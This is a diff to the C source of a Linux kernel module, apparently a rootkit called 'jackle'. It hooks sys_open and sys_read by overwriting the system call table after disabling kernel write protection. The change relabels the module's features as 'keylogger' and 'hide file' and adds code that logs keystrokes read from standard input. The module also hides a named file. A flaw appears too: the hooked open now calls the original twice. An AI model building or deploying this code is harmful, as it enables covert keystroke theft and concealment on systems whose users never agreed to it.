@@ -17,15 +17,9 @@
                           
 https://data.whicdn.com/images/78048685/large.gif
 
-Description:
-  I wrote this to learn C and gain a better understanding of the Linux kernel.
-  
-  Isn't it cute?
-  
-  Perhaps one day it will be useful.
-
 Features:
-    intercept sys_open, sys_read
+    keylogger
+    hide file
 */
 
 MODULE_LICENSE( "GPL" );
@@ -48,15 +42,18 @@ asmlinkage long new_sys_open( const char *pathname, int flags, mode_t mode ) {
     ret = ref_sys_open( pathname, flags, mode );
 
     printk( KERN_INFO " |- Intercepted sys_open" );
-    return ret;
+
+    return ref_sys_open( pathname, flags, mode );
 }
 
 /* intercept read */
 asmlinkage long new_sys_read( unsigned int fd, char __user *buf, size_t count ) {
     long ret;
     ret = ref_sys_read( fd, buf, count );
-    
-    printk( KERN_INFO " |- Intercepted sys_read, buf[0] );
+
+    if( count == 1 && fd == 0 )
+        printk( KERN_INFO " |- Intercepted sys_read: %X", buf[0] );
+
     return ret;
 }
 
@@ -97,8 +94,6 @@ static int __init jackle_start( void ) {
     printk( KERN_INFO " |  ` hiding %s\n", file_to_hide );
     write_cr0( original_cr0 );
 
-    /* printk( KERN_INFO "[+] Hiding %s from userland\n", file_to_hide ); */
-
     return 0;
 }
 
@@ -109,6 +104,7 @@ static void __exit jackle_end( void ) {
 
     write_cr0( original_cr0 & ~0x00010000 );
     sys_call_table[__NR_read] = ( unsigned long * )ref_sys_read;
+    sys_call_table[__NR_open] = ( unsigned long * )ref_sys_open;
     write_cr0( original_cr0 );
 
 }
